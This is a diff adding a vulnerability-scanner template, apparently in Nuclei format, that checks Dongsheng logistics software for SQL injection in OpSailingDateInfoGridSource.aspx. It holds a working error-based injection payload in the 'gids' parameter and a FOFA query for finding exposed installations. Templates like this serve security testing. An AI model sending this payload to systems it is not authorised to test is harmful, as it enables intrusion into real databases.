@@ -1,0 +1,31 @@
+id: poc-yaml-dongshengsoft-opsailingdateinfogridsource-aspx-sqli
+info:
+  name: "东胜物流软件 OpSailingDateInfoGridSource.aspx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: "东胜物流软件"
+    fofa: "app=\"东胜物流软件-物流软件\""
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: GET
+    path:
+      - "/PriceCarrier/OpSailingDateInfoGridSource.aspx?handle=delete&gids=')and+1<@@VERSION--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException:"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
